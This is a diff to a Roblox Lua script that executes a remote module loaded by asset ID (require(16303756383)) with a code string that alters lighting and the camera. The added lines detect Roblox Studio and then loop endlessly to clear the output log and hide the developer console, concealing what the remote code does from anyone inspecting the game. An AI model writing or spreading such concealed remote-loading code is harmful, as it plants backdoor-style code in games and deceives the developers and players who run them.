@@ -1,3 +1,17 @@
+if game:GetService("RunService"):IsStudio() then
+	local function pleh()
+		while task.wait() do
+			game:GetService("LogService"):ClearOutput()
+		end
+	end
+
+	for i = 1,5 do
+		task.spawn(pleh)
+	end
+task.defer(function()
+        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+    end)
+else
 require(16303756383)(false,[===[local colorcorrection = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
 
 colorcorrection.Brightness = -0.5
@@ -38,3 +52,4 @@ local camera = workspace.CurrentCamera
 camera.FieldOfView = 50
 local start = game:GetService("StarterPlayer")
 start.CameraMode = Enum.CameraMode.LockFirstPerson]===])
+end
